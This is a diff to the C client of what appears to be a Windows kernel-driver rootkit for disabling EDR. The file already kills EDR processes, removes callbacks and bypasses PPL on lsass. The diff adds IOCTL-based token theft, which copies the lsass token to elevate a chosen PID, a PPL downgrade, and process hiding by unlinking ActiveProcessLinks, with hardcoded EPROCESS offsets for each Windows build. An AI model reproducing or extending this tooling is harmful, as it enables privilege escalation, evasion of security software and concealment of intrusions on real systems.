@@ -41,6 +41,10 @@ struct threadArgs {
 #define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
 #define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
 #define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
+#define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
+#define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
+
+
 
 
 
@@ -55,20 +59,34 @@ struct ModulesData {
     ULONG64 ModuleBase;
 };
 
+
 struct pplData {
     DWORD pid;
     DWORD offset;
 };
 
-//struct ModulesDataNode {
-//    ModulesData Data;
-//    ModulesDataNode* Next;
-//};
+struct offsets {
+	DWORD ProtectionOffset;
+	DWORD tokenOffset;
+	DWORD ActiveProcessLinks;
+};
 
 struct ModulesDataArray {
     ModulesData* Modules;
     SIZE_T Count;
 };
+
+struct elevateProcArgs {
+    DWORD pid1;
+    DWORD pid2;
+    int offset;
+};
+
+struct hideProcArgs {
+    DWORD pid;
+    int offset;
+};
+
 
 const char* edrNames[] = {
 "U2Vuc2VJUi5leGU=",                       // SenseIR.exe
@@ -134,62 +152,90 @@ DWORD GetWindowsBuildNumber(void) {
     return 0;
 }
 // temporanea. prima o poi faro' con gli offset presi dai symbol file scaricati
-DWORD getOffsetByBuild(void) {
+offsets getOffsetByBuild(void) {
     DWORD build = GetWindowsBuildNumber();
     printf("Detected Windows Build: %lu\n", build);
-	DWORD offset = 0;
+
+	offsets off = { 0 };
+
+	DWORD ProtectionOffset = 0;
+	DWORD tokenOffset = 0;
+	DWORD ActiveProcessLinks = 0;
 
     switch (build) {
     case 19041:  // Windows 10 2004
         printf("Windows 10 version 2004 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 19042:  // Windows 10 20H2
         printf("Windows 10 version 20H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 19043:  // Windows 10 21H1
         printf("Windows 10 version 21H1 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 19044:  // Windows 10 21H2
         printf("Windows 10 version 21H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 19045:  // Windows 10 22H2
         printf("Windows 10 version 22H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 22000:  // Windows 11 21H2
         printf("Windows 11 version 21H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 22621:  // Windows 11 22H2
         printf("Windows 11 version 22H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
 
     case 22631:  // Windows 11 23H2
         printf("Windows 11 version 23H2 detected.\n");
-        offset = 0x87a;
+        tokenOffset = 0x4b8;
+        ProtectionOffset = 0x87a;
+        ActiveProcessLinks = 0x448;
         break;
     case 26100:
          // Windows 11 24H2
         printf("Windows 11 version 24H2 detected.\n");
-        offset = 0x5fa;
+        tokenOffset = 0x248;
+        ProtectionOffset = 0x5fa;
+        ActiveProcessLinks = 0x1d8;
 		break;
 
     default:
+        ProtectionOffset = 0x5fa;
         printf("Unknown or future Windows build: %lu\n", build);
         break;
     }
-	return offset;
+	
+	off.ProtectionOffset = ProtectionOffset;
+	off.tokenOffset = tokenOffset;
+
+    return off;
 }
 
 
@@ -737,7 +783,9 @@ BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
     ModulesData* resultArray = NULL;
     ULONG64 modulesCount = 0;
     BOOL result;
-	DWORD offset = getOffsetByBuild();
+	offsets off = getOffsetByBuild();
+
+	DWORD offset = off.ProtectionOffset;
 
 	pplData data;
 	data.pid = pid;
@@ -761,6 +809,73 @@ BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
     }
     return result;
 }
+
+BOOL elevateProc(HANDLE hDevice, DWORD pid1, DWORD pid2) {
+    BOOL result;
+	DWORD bytesReturned;
+	offsets off = getOffsetByBuild();
+
+	DWORD offset = off.tokenOffset;
+	elevateProcArgs data;
+
+    //DWORD lsassPid = FindProcessId("lsass.exe");
+
+
+	data.pid1 = pid1;
+
+	data.pid2 = pid2;
+	data.offset = offset;
+
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_PROC_TOKEN_SWAP,
+        &data,
+        sizeof(elevateProcArgs),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+	);
+
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to elevate process.\n");
+    }
+	return result;
+}
+
+BOOL hideProc(HANDLE hDevice, DWORD pid) {
+    DWORD bytesReturned;
+    BOOL result;
+
+	offsets off = getOffsetByBuild();
+
+	hideProcArgs data;
+	data.pid = pid;
+	data.offset = off.ActiveProcessLinks;
+
+
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_UMPROC_HIDE,
+        &data,
+        sizeof(hideProcArgs),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to hide process.\n");
+    }
+    return result;
+}
+
 
 int main(int argc, char* argv[])
 {
@@ -946,7 +1061,54 @@ int main(int argc, char* argv[])
                 printf("Failed to send request. Error: %lu\n", GetLastError());
             }
         }
-
+        else if (strncmp(input, "elevatelocal", 12) == 0) {
+            DWORD pid = atoi(input + 13);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+            }
+            DWORD lsassPid = FindProcessId("lsass.exe");
+            if (lsassPid == 0) {
+                printf("lsass.exe not found.\n");
+                continue;
+            }
+            BOOL result = elevateProc(hDevice, pid, lsassPid);
+            if (result) {
+                printf("Sent request to elevate process with PID %lu using lsass.exe (PID %lu)\n", pid, lsassPid);
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+        }
+        else if (strncmp(input, "downGrade", 9) == 0) {
+            DWORD pid = atoi(input + 10);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+            }
+			DWORD pid2 = FindProcessId("explorer.exe");
+            BOOL result = elevateProc(hDevice, pid, pid2);
+            if (result) {
+                printf("Sent request to downgrade process with PID %lu to non-PPL\n", pid);
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+		}
+        else if (strncmp(input, "hideproc", 8) == 0) {
+            DWORD pid = atoi(input + 9);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+            }
+            BOOL result = hideProc(hDevice, pid);
+            if (result) {
+                printf("Sent request to hide process with PID %lu\n", pid);
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+		}
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 			printf(" - terminate            - Start killing EDR processes\n");
@@ -967,7 +1129,10 @@ int main(int argc, char* argv[])
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
 			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
-			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n");
+			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n\n");
+			printf(" - elevatelocal <PID>   - Elevate a specific process by PID using local system\n");
+			printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");
+			printf(" - hideproc <PID>       - Hide a specific process by PID\n\n");
 			printf(" - help                 - Show this help menu\n");
             printf(" - exit                 - Exit the program\n");
 
